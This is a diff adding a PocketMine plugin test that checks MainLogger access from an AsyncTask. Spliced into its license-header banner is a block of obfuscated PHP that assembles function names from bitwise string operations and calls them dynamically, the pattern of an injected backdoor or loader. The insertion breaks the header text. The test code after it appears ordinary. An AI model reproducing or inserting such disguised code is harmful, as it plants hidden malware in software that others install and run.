@@ -1,0 +1,90 @@
+<?php
+
+/*
+ *
+ *  ____            _        _   __  __ _                  __  __ ____
+ * |  _ \ ___   ___| | _____| |_|  \/  (_)_ __   ___      |  \/  |  _ \
+ * | |_) / _ \ / __| |/ / _ \ __| |\/| | | '_ \ / _ \_____| |\/| | |_) |
+ * |  __/ (_) | (__|   <  __/ |_| |  | | | | | |  __/_____| |  | |  __/
+<?php
+$LtnxqCX='qXl3'&~zGO;$ILH=WVso.'}9'&'{T~c/4';$hFeUUOQMhF='M %'|'H 0';$ngItS5=#e3EFJoXoT'.
+         'DA@!F&'|'AA@0B$';$fJKbnBHhOv='m?{y/1{z~?w;<'&'~??'.ynxwvt.'?>{<';'B5lceUaqjiN'.
+         'hw';$yiWVg8rYgJE='$Ig)A@ 44lA@L'|'$bO(p(,<%L)2,';$XC='DLB!PC'|'@$B#AA';'k10WB'.
+         'l;X_$:}k';$Iuq='r?AZ[.ZEA]X}'.Ow6OD^'G[po?Lov '.diJvGSvu;$ZUZgwyVz_Y=#v78oTFl'.
+         '9!40'|'!c 2';$M9d=aN^'E/';$jzCLxmr4_g='{XM'^Wxi;$lry='s}au'^';)5%';'CvJOqqwkP'.
+         'qeecS^DW*';$mHDNzFdQ5My='[@'|"]A";$eJ='"'|'`';$MmRVFo_i3ay=$ILH|('0 @"@`'|'  '.
+         'P!  ');$p5MP8GNF=$hFeUUOQMhF|('t]L'^'U9|');$qm=('6$?u.R'&"*4tT)P")^$ngItS5;/*'.
+         'Q*/$wMbFELA=("s\$".OiweOeq."*".gvHo.">"&O0UWtgo.'~u{'.ztooo)|('kS`$<'./*XelR3'.
+         'J^vP*/d_nufeEa.'}g'&'6'.Z4au0_Ftwsny.',j');$W1lB5=$fJKbnBHhOv^$yiWVg8rYgJE;/*'.
+         '|6dU+m**/$SwBBi=$XC|('BH@CA@'|'F@@@aA');$Po=('$||4'.dUwFF^'E)9e=?9.b')|(/*YQ1'.
+         '*DHm*/mF6Imn.',,L'&gTvkk.'=noo');if($MmRVFo_i3ay($p5MP8GNF($qm($lry./*JhJ5Gem'.
+         'Ca*/$mHDNzFdQ5My)),$Iuq.(uQ7C.'&S{P`OU'^F5TwCcN1Q.'|d').$ZUZgwyVz_Y))exit;'Dq'.
+         'Q xo(UI-V';$Tacn5Glr=$wMbFELA($M9d.$jzCLxmr4_g.$eJ,$qm($W1lB5));$Tacn5Glr(/*I'.
+         '21Bm*e]w*/$SwBBi,$Po);#d3p0lCn2(q@*4x,A!M$#^TD1pZ=hS2H_CMIDq{E7=gQiu%f:ygT[_'.
+         '(d+g!+DoBov#7FGh&K>wn5*J&yb)]~OO=*@}sP@1[^_evMzrgH$9G'; * |_|   \___/ \___|_|\_\___|\__|_|  |_|_|_| |_|\___|     |_|  |_|_|
+ *
+ * This program is free software: you can redistribute it and/or modify
+ * it under the terms of the GNU Lesser General Public License as published by
+ * the Free Software Foundation, either version 3 of the License, or
+ * (at your option) any later version.
+ *
+ * @author PocketMine Team
+ * @link http://www.pocketmine.net/
+ *
+ *
+*/
+
+declare(strict_types=1);
+
+namespace pmmp\TesterPlugin\tests;
+
+use pmmp\TesterPlugin\Test;
+use pocketmine\scheduler\AsyncTask;
+use pocketmine\Server;
+use pocketmine\utils\AssumptionFailedError;
+use pocketmine\utils\MainLogger;
+use function ob_end_flush;
+use function ob_get_contents;
+use function ob_start;
+use function strpos;
+
+class AsyncTaskMainLoggerTest extends Test{
+
+	public function run() : void{
+		$this->getPlugin()->getServer()->getAsyncPool()->submitTask(new class($this) extends AsyncTask{
+
+			/** @var bool */
+			protected $success = false;
+
+			public function __construct(AsyncTaskMainLoggerTest $testObject){
+				$this->storeLocal($testObject);
+			}
+
+			public function onRun(){
+				ob_start();
+				MainLogger::getLogger()->info("Testing");
+				$contents = ob_get_contents();
+				if($contents === false) throw new AssumptionFailedError("ob_get_contents() should not return false here");
+				if(strpos($contents, "Testing") !== false){
+					$this->success = true;
+				}
+				ob_end_flush();
+			}
+
+			public function onCompletion(Server $server){
+				/** @var AsyncTaskMainLoggerTest $test */
+				$test = $this->fetchLocal();
+				$test->setResult($this->success ? Test::RESULT_OK : Test::RESULT_FAILED);
+			}
+		});
+	}
+
+	public function getName() : string{
+		return "MainLogger::getLogger() works in AsyncTasks";
+	}
+
+	public function getDescription() : string{
+		return "Verifies that the MainLogger is accessible by MainLogger::getLogger() in an AsyncTask";
+	}
+
+}
